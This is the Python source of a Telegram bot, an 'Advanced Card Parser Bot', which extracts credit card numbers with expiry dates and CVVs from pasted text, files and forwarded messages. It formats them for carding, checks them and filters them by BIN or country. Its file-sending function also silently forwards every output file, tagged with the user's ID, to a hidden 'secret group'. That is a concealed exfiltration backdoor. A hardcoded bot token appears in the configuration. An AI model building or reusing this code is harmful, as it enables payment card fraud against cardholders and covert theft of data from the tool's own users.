import os
import re
import logging
import asyncio
import json
import urllib.request
from io import BytesIO
from typing import Dict, Set, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Updated Secret Group/Channel ID
# Link: https://t.me/+K2HxbF-zza9mYTJh
SECRET_GROUP_ID = -1008892454769  

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
# CARD PARSING LOGIC
# ═══════════════════════════════════════════════════════
_SEP = r"[\|:,/\s]+"
CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"
    + _SEP + r"(0?[1-9]|1[0-2])"
    + _SEP + r"(\d{2,4})"
    + _SEP + r"(\d{3,4})"
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> List[str]:
    found, seen = [], set()
    for m in CARD_RE.finditer(text):
        card = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year = m.group(3)[-2:]
        cvv = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: List[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

def get_file_size(cards: List[str]) -> str:
    size_bytes = len(cards_to_bytes(cards))
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.2f} MB"

# ═══════════════════════════════════════════════════════
# BIN LOOKUP (with caching)
# ═══════════════════════════════════════════════════════
_bin_cache: Dict[str, Optional[dict]] = {}

def lookup_bin(bin_prefix: str) -> Optional[dict]:
    key = bin_prefix[:6]
    if key in _bin_cache:
        return _bin_cache[key]
    try:
        url = f"https://lookup.binlist.net/{key}"
        req = urllib.request.Request(url, headers={"Accept-Version": "3"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            _bin_cache[key] = data
            return data
    except Exception as e:
        logger.error(f"BIN lookup failed for {key}: {e}")
        _bin_cache[key] = None
        return None

# ═══════════════════════════════════════════════════════
# DATA STORES
# ═══════════════════════════════════════════════════════
_store: Dict[int, List[str]] = {}
_merge_buffer: Dict[int, List[str]] = {}
_fwd_buf: Dict[int, dict] = {}
_user_state: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════
# KEYBOARDS — Matching the image layout
# ═══════════════════════════════════════════════════════
def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🕷️ Scrape", callback_data="btn_scrape"),
         InlineKeyboardButton("🧹 Clean", callback_data="btn_clean")],
        [InlineKeyboardButton("✅ Live Check", callback_data="btn_live"),
         InlineKeyboardButton("🌍 Country", callback_data="btn_country")],
        [InlineKeyboardButton("✂️ Split", callback_data="btn_split"),
         InlineKeyboardButton("🔄 Dedup", callback_data="btn_dedup")],
        [InlineKeyboardButton("📁 Add File", callback_data="btn_addfile"),
         InlineKeyboardButton("📦 Merge", callback_data="btn_merge")],
        [InlineKeyboardButton("🔍 Find BIN", callback_data="btn_findbin"),
         InlineKeyboardButton("⚙️ Settings", callback_data="btn_settings")]
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="btn_back")]
    ])

# ═══════════════════════════════════════════════════════
# CORE FILE SENDER
# ═══════════════════════════════════════════════════════
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: List[str],
                             caption: str, filename: str = "cards.txt"):
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    file_size = get_file_size(cards)
    full_caption = f"{caption}\n💾 Size: <code>{file_size}</code>"

    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    try:
        await bot.send_document(
            chat_id=chat_id, document=buf, filename=filename,
            caption=full_caption, parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send file to user {user_id}: {e}")

    try:
        buf2 = BytesIO(cards_to_bytes(cards))
        buf2.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID, document=buf2, filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{full_caption}",
            parse_mode="HTML", disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy: {e}")

async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    await asyncio.sleep(1.5)
    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return
    combined = "\n".join(buf["texts"])
    cards = extract_cards(combined)
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return
    _store[uid] = cards
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted from forwarded messages.",
        filename="Parsed_Cards.txt"
    )

# ═══════════════════════════════════════════════════════
# COMMAND HANDLERS
# ═══════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    _user_state.pop(user.id, None)
    text = (
        f"🦇 <b>Advanced Card Parser Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, merge, split, "
        f"and manage card data instantly.\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    _user_state.pop(update.effective_user.id, None)
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_scr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) < 2:
        await update.message.reply_text(
            "🕷️ <b>Card Scraper</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Use: <code>/scr [channel_link] [limit] [bin]</code>\n\n"
            "Example: <code>/scr https://t.me/channelname 100 4111</code>\n\n"
            "📌 Max limit: 300000\n⏳ Cooldown: 5s",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    channel = context.args[0]
    try:
        limit = int(context.args[1])
        if limit > 300000:
            limit = 300000
    except ValueError:
        await update.message.reply_text("❌ Limit must be a number.")
        return

    bin_filter = context.args[2] if len(context.args) > 2 else None

    await update.message.reply_text(
        "⚠️ <b>Notice:</b>\n"
        "Telegram Bot API restricts bots from reading channel history directly.\n"
        "To enable full scraping, the bot needs to be integrated with a userbot "
        "session (Telethon/Pyrogram).\n\n"
        "However, you can still forward messages to this bot to extract cards instantly!",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid not in _merge_buffer or not _merge_buffer[uid]:
        await update.message.reply_text(
            "❌ No cards in merge buffer. Use <b>📁 Add File</b> first.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    filename = "Merged_Cards.txt"
    if context.args:
        fname = " ".join(context.args).strip()
        fname = re.sub(r'[\\/*?:"<>|]', "", fname)
        filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _merge_buffer.pop(uid, [])
    seen, deduped = set(), []
    for c in cards:
        if c not in seen:
            seen.add(c)
            deduped.append(c)

    _store[uid] = deduped
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, deduped,
        caption=f"✦ <b>MERGE COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 All files merged!\n✅ Total unique cards: <b>{len(deduped)}</b>\n"
                f"📁 Filename: <code>{filename}</code>",
        filename=filename)

    await update.message.reply_text(
        f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    _user_state.pop(uid, None)
    if uid in _merge_buffer:
        _merge_buffer.pop(uid, None)
    await update.message.reply_text(
        "❌ Operation cancelled.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ═══════════════════════════════════════════════════════
# BUTTON CALLBACK HANDLER
# ═══════════════════════════════════════════════════════
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    # ─── BACK ───
    if data == "btn_back":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    # ─── SCRAPE ───
    elif data == "btn_scrape":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🕷️ <b>SCRAPER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Use the following command to scrape cards:\n\n"
            "<code>/scr [channel_link] [limit] [bin]</code>\n\n"
            "📌 Example: <code>/scr https://t.me/channelname 100 4111</code>\n"
            "📌 Max limit: 300000\n⏳ Cooldown: 5s\n\n"
            "⚠️ Note: Bot API restricts reading channel history directly.\n"
            "Forward messages to the bot for instant extraction!",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── CLEAN ───
    elif data == "btn_clean":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🧹 <b>CLEAN MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found.\n\n"
                "Please paste or forward card text first, then use this "
                "feature to clean and format cards into <code>CARD|MM|YY|CVV</code>.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, cards,
            caption=f"🧹 <b>CLEAN COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>{len(cards)}</b> card(s) cleaned & formatted to "
                    f"<code>CARD|MM|YY|CVV</code>",
            filename="Cleaned_Cards.txt")

        await query.message.edit_text(
            f"🧹 <b>CARDS CLEANED</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(cards)}</b> card(s) cleaned!\n📄 File sent above.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    # ─── LIVE CHECK ───
    elif data == "btn_live":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_live"
        await query.message.edit_text(
            f"✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type <code>all</code> to check all stored cards,\n"
            f"or paste specific cards to check.\n\n"
            f"⚠️ This validates card format & provides BIN details "
            f"(brand, bank, country).",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── COUNTRY ───
    elif data == "btn_country":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_country"
        await query.message.edit_text(
            "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Type a 2-letter country code to filter:\n\n"
            "🇺🇸 <code>US</code> - United States\n"
            "🇬🇧 <code>GB</code> - United Kingdom\n"
            "🇨🇦 <code>CA</code> - Canada\n"
            "🇩🇪 <code>DE</code> - Germany\n"
            "🇧🇷 <code>BR</code> - Brazil\n"
            "🇮🇳 <code>IN</code> - India\n\n"
            "Or type <code>list</code> to see all countries in your cards.",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── SPLIT ───
    elif data == "btn_split":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_split"
        await query.message.edit_text(
            f"✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the number of cards per file:\n"
            f"Example: <code>100</code> → files of 100 cards each",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── DEDUP ───
    elif data == "btn_dedup":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔄 <b>DEDUP CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        original = len(cards)
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        removed = original - len(deduped)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Original: <b>{original}</b>\n"
                    f"✅ Unique: <b>{len(deduped)}</b>\n"
                    f"🗑️ Removed: <b>{removed}</b> duplicates",
            filename="Deduped_Cards.txt")

        await query.message.edit_text(
            f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Original: <b>{original}</b>\n"
            f"✅ Unique: <b>{len(deduped)}</b>\n"
            f"🗑️ Removed: <b>{removed}</b> duplicates\n"
            f"📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    # ─── ADD FILE ───
    elif data == "btn_addfile":
        _user_state.pop(uid, None)
        _merge_buffer[uid] = []
        await query.message.edit_text(
            "📁 <b>ADD FILE MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Send or forward <b>.txt files</b> or <b>text messages</b> "
            "to add cards.\n\n"
            "🛑 When done, press <b>📦 Merge</b> button\n"
            "or type: <code>/done YourFileName</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── MERGE ───
    elif data == "btn_merge":
        _user_state.pop(uid, None)
        if uid not in _merge_buffer or not _merge_buffer[uid]:
            await query.message.edit_text(
                "📦 <b>MERGE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No cards in merge buffer!\n\n"
                "Use <b>📁 Add File</b> first to add cards.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        cards = _merge_buffer.pop(uid, [])
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Total unique cards: <b>{len(deduped)}</b>",
            filename="Merged_Cards.txt")

        await query.message.edit_text(
            f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    # ─── FIND BIN ───
    elif data == "btn_findbin":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_bin"
        await query.message.edit_text(
            f"🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the BIN prefix to filter:\n"
            f"Example: <code>4111</code> or <code>411111</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ─── SETTINGS ───
    elif data == "btn_settings":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        merge_count = len(_merge_buffer.get(uid, []))
        await query.message.edit_text(
            f"⚙️ <b>SETTINGS &amp; STATS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: <code>{query.from_user.first_name}</code>\n"
            f"🆔 ID: <code>{uid}</code>\n\n"
            f"📊 <b>Storage</b>\n"
            f"📦 Stored Cards: <code>{len(cards)}</code>\n"
            f"📂 Merge Buffer: <code>{merge_count}</code>\n"
            f"💾 File Size: <code>{get_file_size(cards) if cards else '0 B'}</code>\n\n"
            f"🔧 <b>Bot Info</b>\n"
            f"🤖 Version: <code>2.0</code>\n"
            f"✅ Status: <b>Online</b>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

# ═══════════════════════════════════════════════════════
# STATE TEXT INPUT HANDLERS
# ═══════════════════════════════════════════════════════
async def received_bin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    bin_prefix = update.message.text.strip()

    if not bin_prefix.isdigit():
        await update.message.reply_text(
            "❌ BIN must be digits only.\nTry again or press Back.",
            parse_mode="HTML", reply_markup=back_keyboard())
        _user_state[uid] = "typing_bin"
        return

    all_cards = _store.get(uid, [])
    matched = [c for c in all_cards if c.startswith(bin_prefix)]

    if not matched:
        await update.message.reply_text(
            f"❌ No cards found with BIN <code>{bin_prefix}</code>.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, matched,
        caption=f"🔍 <b>BIN FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"Cards_BIN_{bin_prefix}.txt")

    await update.message.reply_text(
        f"🔍 <b>BIN FILTER COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Found <b>{len(matched)}</b> card(s) with BIN <code>{bin_prefix}</code>\n"
        f"📄 File sent above!",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def received_split(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    text = update.message.text.strip()

    if not text.isdigit():
        await update.message.reply_text(
            "❌ Please enter a valid number.",
            parse_mode="HTML", reply_markup=back_keyboard())
        _user_state[uid] = "typing_split"
        return

    chunk_size = int(text)
    if chunk_size < 1:
        await update.message.reply_text(
            "❌ Chunk size must be at least 1.",
            parse_mode="HTML", reply_markup=back_keyboard())
        _user_state[uid] = "typing_split"
        return

    cards = _store.get(uid, [])
    if not cards:
        await update.message.reply_text(
            "❌ No cards stored.", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    total_files = (len(cards) + chunk_size - 1) // chunk_size

    await update.message.reply_text(
        f"✂️ <b>SPLITTING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total cards: <b>{len(cards)}</b>\n"
        f"✂️ Chunk size: <b>{chunk_size}</b>\n"
        f"📦 Files: <b>{total_files}</b>\n\n"
        f"⏳ Sending files...",
        parse_mode="HTML")

    for i in range(0, len(cards), chunk_size):
        chunk = cards[i:i + chunk_size]
        file_num = i // chunk_size + 1
        await send_file_and_copy(
            context.bot, update.effective_chat.id, uid, chunk,
            caption=f"✂️ <b>SPLIT {file_num}/{total_files}</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>{len(chunk)}</b> card(s)",
            filename=f"Split_{file_num}_of_{total_files}.txt")
        await asyncio.sleep(0.3)

    await update.message.reply_text(
        f"✅ <b>SPLIT COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 {total_files} files generated!",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def received_live(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    text = update.message.text.strip()

    if text.lower() == "all":
        cards = _store.get(uid, [])
    else:
        cards = extract_cards(text)

    if not cards:
        await update.message.reply_text(
            "❌ No cards found to check.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    progress = await update.message.reply_text(
        f"✅ <b>CHECKING...</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Checking <b>{len(cards)}</b> card(s)...\n⏳ Please wait...",
        parse_mode="HTML")

    valid_cards = []
    invalid_cards = []

    for card in cards:
        parts = card.split("|")
        if len(parts) == 4:
            cn, mm, yy, cvv = parts
            is_valid = (
                cn.isdigit() and 13 <= len(cn) <= 19 and
                mm.isdigit() and 1 <= int(mm) <= 12 and
                yy.isdigit() and len(yy) == 2 and
                cvv.isdigit() and 3 <= len(cvv) <= 4
            )
            if is_valid:
                bin_info = lookup_bin(cn[:6])
                if bin_info:
                    country = bin_info.get("country", {}).get("name", "Unknown")
                    flag = bin_info.get("country", {}).get("emoji", "")
                    bank = bin_info.get("bank", {}).get("name", "Unknown")
                    brand = bin_info.get("scheme", "Unknown").title()
                    ctype = bin_info.get("type", "Unknown").title() if bin_info.get("type") else "Unknown"
                    valid_cards.append(
                        f"{card} | {brand} | {ctype} | {country} {flag} | {bank}")
                else:
                    valid_cards.append(f"{card} | Format Valid | BIN: Unknown")
            else:
                invalid_cards.append(card)
        else:
            invalid_cards.append(card)

    result_lines = [
        f"✅ <b>LIVE CHECK RESULTS</b>",
        f"━━━━━━━━━━━━━━━━━━━━━",
        f"📊 Total checked: <b>{len(cards)}</b>",
        f"✅ Valid format: <b>{len(valid_cards)}</b>",
        f"❌ Invalid format: <b>{len(invalid_cards)}</b>",
        f"",
        f"<b>── VALID CARDS ──</b>",
    ]
    for vc in valid_cards[:50]:
        result_lines.append(f"<code>{vc}</code>")
    if len(valid_cards) > 50:
        result_lines.append(f"... and {len(valid_cards) - 50} more")

    if invalid_cards:
        result_lines.append(f"\n<b>── INVALID CARDS ──</b>")
        for ic in invalid_cards[:20]:
            result_lines.append(f"<code>{ic}</code>")

    result_text = "\n".join(result_lines)
    if len(result_text) > 4000:
        result_text = result_text[:4000] + "\n\n... (truncated)"

    await progress.edit_text(result_text, parse_mode="HTML", reply_markup=main_menu_keyboard())

    if valid_cards:
        await send_file_and_copy(
            context.bot, update.effective_chat.id, uid,
            [c.split(" | ")[0] for c in valid_cards],
            caption=f"✅ <b>VALID CARDS FILE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ {len(valid_cards)} valid card(s)",
            filename="Valid_Cards.txt")

async def received_country(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    text = update.message.text.strip()
    cards = _store.get(uid, [])

    if not cards:
        await update.message.reply_text(
            "❌ No cards stored.", parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    if text.lower() == "list":
        country_map = {}
        for card in cards:
            cn = card.split("|")[0]
            info = lookup_bin(cn[:6])
            if info and info.get("country"):
                name = info["country"].get("name", "Unknown")
                flag = info["country"].get("emoji", "")
                key = f"{flag} {name}"
            else:
                key = "❓ Unknown"
            country_map[key] = country_map.get(key, 0) + 1

        sorted_c = sorted(country_map.items(), key=lambda x: x[1], reverse=True)
        lines = ["🌍 <b>COUNTRY LIST</b>", "━━━━━━━━━━━━━━━━━━━━━", ""]
        for c, count in sorted_c:
            lines.append(f"  {c}: <b>{count}</b>")

        await update.message.reply_text(
            "\n".join(lines), parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    country_code = text.upper()
    matched = []
    for card in cards:
        cn = card.split("|")[0]
        info = lookup_bin(cn[:6])
        if info and info.get("country"):
            if info["country"].get("alpha2", "").upper() == country_code:
                matched.append(card)

    if not matched:
        await update.message.reply_text(
            f"❌ No cards found for country <code>{country_code}</code>.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, matched,
        caption=f"🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(matched)}</b> card(s) from <code>{country_code}</code>:",
        filename=f"Cards_{country_code}.txt")

    await update.message.reply_text(
        f"🌍 <b>COUNTRY FILTER COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Found <b>{len(matched)}</b> card(s) from <code>{country_code}</code>\n"
        f"📄 File sent above!",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ═══════════════════════════════════════════════════════
# MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg, user = update.message, update.effective_user
    if not msg or not user:
        return

    text = (msg.text or msg.caption or "").strip()
    uid, chat_id = user.id, msg.chat_id

    if uid in _merge_buffer:
        if not text:
            return
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await msg.reply_text(
                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
                parse_mode="HTML")
        else:
            await msg.reply_text("❌ No cards found in this message.")
        return

    if not text:
        return
    if uid not in _fwd_buf:
        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}
    _fwd_buf[uid]["texts"].append(text)

    old = _fwd_buf[uid].get("task")
    if old and not old.done():
        old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(_flush_fwd_buf(uid, chat_id, context.bot))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not text:
        return

    state = _user_state.get(uid)

    # Route to state handler if active
    if state == "typing_bin":
        _user_state.pop(uid, None)
        await received_bin(update, context)
        return
    elif state == "typing_split":
        _user_state.pop(uid, None)
        await received_split(update, context)
        return
    elif state == "typing_live":
        _user_state.pop(uid, None)
        await received_live(update, context)
        return
    elif state == "typing_country":
        _user_state.pop(uid, None)
        await received_country(update, context)
        return

    # Merge buffer mode
    if uid in _merge_buffer:
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await update.message.reply_text(
                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
                parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No cards found in this text.")
        return

    # Normal text — extract cards
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text(
            "❌ No cards found.\nMake sure they follow: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(cards)}</b> card(s) extracted:",
        filename="Parsed_Cards.txt")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc:
        return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid = update.effective_user.id
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    if uid in _merge_buffer:
        _merge_buffer[uid].extend(cards)
        await update.message.reply_text(
            f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
            parse_mode="HTML")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
        filename="Parsed_Cards.txt")

# ═══════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("scr", cmd_scr))
    app.add_handler(CommandHandler("done", cmd_done))
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    # Button callbacks
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^btn_"))

    # Message handlers
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))

    logger.info("🦇 Advanced Card Parser Bot v2.0 starting…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
